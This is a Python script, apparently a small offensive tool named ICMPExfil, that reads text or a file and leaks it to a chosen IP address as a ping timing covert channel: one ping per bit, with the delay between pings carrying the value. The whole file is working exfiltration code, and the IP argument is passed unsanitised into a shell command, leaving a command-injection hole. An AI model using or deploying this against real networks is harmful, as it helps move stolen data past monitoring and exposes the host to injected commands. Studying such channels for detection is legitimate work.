"""
Ping Data Exfiltration
This script will allow you to convert data into pings, like morse code
Martino Jones 20180105

"""

import argparse
import subprocess
from os import devnull
from time import sleep

# Arguments the user can pass in to slightly modify the runtime
parser = argparse.ArgumentParser(description='ICMPExfil encode and send script.')
parser.add_argument('--wait', type=int,
                    help='Number of additional seconds to wait for leeway.')
parser.add_argument('--ip', type=str,
                    help='IP Address to send ping, defaults to loopback address.')
parser.add_argument('--show', action='store_true',
                    help='Shows the pings if you would like output.')
parser.add_argument('--ascii', type=str,
                    help='ASCII Data type: ASCII characters you wish to transmit.')
parser.add_argument('--asciiFile', type=str,
                    help='ASCII File Data type: File of ASCII characters you wish to transmit.')
args = parser.parse_args()

# Seconds of additional time to wait in-between pings
wait = 0
# This is the IP address you wish to ping
ipToPing = "127.0.0.1"
# Array of binary to be used for timing
dataArray = []
# Should the script output the ping stdout
show = False
# Data type
DATATYPE = "NONE"

# Get additional wait time if user provided is
if args.wait:
    wait = int(args.wait)
if args.ip:
    ipToPing = args.ip
if args.show:
    show = True
if args.ascii:
    DATATYPE = "ASCII"
if args.asciiFile:
    DATATYPE = "ASCIIFILE"

def string2bits(s=''):
    return [bin(ord(x))[2:].zfill(7) for x in s]

def iter_bin(s):
    sb = s.encode('ascii')
    return (format(b, '07b') for b in sb)

def main():

    # There will be a switch here to support other inputs later, example being a file
    # Someone wants to pass in ASCII or an ASCII file
    if DATATYPE == "ASCII" or DATATYPE == "ASCIIFILE":
        ASCIIDATA = ""
        print("Encoding data...")

        # Detect if they want ascii or an ascii file
        if DATATYPE == "ASCII":
            ASCIIDATA = args.ascii
        else:
            ASCIIDATA = open(args.asciiFile)

        # Split the data by character and add to our dataArray
        for line in ASCIIDATA:
            print("Line: " + line.rstrip())
            print("Encoded as: ")
            for char in line:
                # Make sure everything is a number, convert if not
                dataArray.append(''.join(s for s in iter_bin(char)))
                print(dataArray[-1])

        ping(dataArray)

    elif DATATYPE == "NONE":
        # The user didn't pass in a data type :-(
        print("\n***************\nYou need to provide a data type, example --ascii\n*****************\n")
        parser.print_help()
        exit(-1)


def ping(data):
    print("Sending pings please wait...")

    # Decide to show or not based on user input
    if not show:
        FNULL = open(devnull, 'w')
    else:
        FNULL = None

    # Being sending
    i = 0
    for char in data:
        for bit in char:
            # Run systems ping, not writing my own and send to devnull
            print("ping_" + str(i) + " and sleep: " + str(int(bit) + wait))
            subprocess.call(["ping -c 1 " + ipToPing], shell=True, stdout=FNULL)

            # Sleep for the desired amount of time
            sleep(int(bit) + wait)
            i = i + 1

    subprocess.call(["ping -c 1 " + ipToPing], shell=True, stdout=FNULL)
    sleep(5)
    subprocess.call(["ping -c 1 " + ipToPing], shell=True, stdout=FNULL)

    print("Transmition finished for data:")
    print(dataArray)

if __name__ == '__main__':
    main()
